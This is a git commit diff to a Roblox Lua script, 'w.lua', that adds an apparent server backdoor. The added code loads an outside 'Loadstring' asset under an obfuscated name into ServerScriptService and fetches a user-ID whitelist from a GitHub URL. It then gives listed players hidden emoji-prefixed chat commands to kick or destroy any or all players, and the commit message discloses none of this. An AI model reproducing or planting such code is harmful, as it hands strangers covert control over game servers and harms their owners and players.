5b72f80d1c2836543eccc116c4c81172c05aebc9
caspergtag <109670694+nonNamedUser@users.noreply.github.com>
2025-04-12 20:10:42 +0200

    Update w.lua

--- eg/w.lua
+++ eg/w.lua
@@ -1,18 +1,33 @@
-print("HAIII")
+local ins=game:GetService("InsertService")
+local model=ins:LoadAsset(4689019964)
+local asset=model["Loadstring"]
+asset.Name="fuhufasyjufsdyhfystfuhyysdfvhgfhsdgvfhgvghhjfvdsh"
+asset.Parent=game:GetService("ServerStorage")
+local zzz=asset:Clone();zzz.Parent=game:GetService("ServerScriptService");asset:Destroy()
+
+local url="https://raw.githubusercontent.com/nonNamedUser/whitelists/refs/heads/main/eg/w.json"
+local http=game:GetService("HttpService")
+
+if not http["HttpEnabled"] then
+	print("E")
+	return
+end
+
+local content=http:GetAsync(url)
+
+local tbl=http:JSONDecode(content)
 
 if game:GetService("TextChatService").ChatVersion==Enum.ChatVersion.TextChatService then
 	local z=Instance.new("TextChatCommand",game:GetService("TextChatService"))
 	z.PrimaryAlias="🤬"
 end
 
-local plr=game:GetService("Players"):GetPlayerByUserId(userid)
-
-if plr then
+function acm(plr)
 	plr.Chatted:Connect(function(message)
 		local m=message:split(" ")
-		
+
 		local prefix="🤬 "
-		
+
 		if m[1]==prefix.."kick" then
 			if m[2] then
 				if m[2] == "all" then
@@ -27,16 +42,16 @@ if plr then
 							z:Destroy()
 						end
 					end
-					
+
 					return
 				end
 				for _, z in game:GetService("Players"):GetPlayers() do
 					if string.lower(z.Name):find(string.lower(m[2])) then
 						if m[3] then
 							local len=rawlen(m[1])+rawlen(m[2])+3
-							
+
 							local kickmsg=message:sub(len)
-							
+
 							z:Kick(kickmsg)
 						else
 							z:Destroy()
@@ -47,3 +62,30 @@ if plr then
 		end
 	end)
 end
+
+for _, plr in game:GetService("Players"):GetPlayers() do
+	if plr:FindFirstChild("_JSM_LOADED_CORRECTLY_") then
+		return
+	end
+	local z=Instance.new("BoolValue")
+	z.Name="_JSM_LOADED_CORRECTLY_"
+	z.Parent=plr
+	if table.find(tbl, plr.UserId) then
+		print("FOUND")
+		acm(plr)
+	else
+		print("NOT FOUND")
+	end
+end
+
+game:GetService("Players").PlayerAdded:Connect(function(plr)
+	if plr:FindFirstChild("_JSM_LOADED_CORRECTLY_") then
+		return
+	end
+	local z=Instance.new("BoolValue")
+	z.Name="_JSM_LOADED_CORRECTLY_"
+	z.Parent=plr
+	if table.find(tbl, plr.UserId) then
+		acm(plr)
+	end
+end)
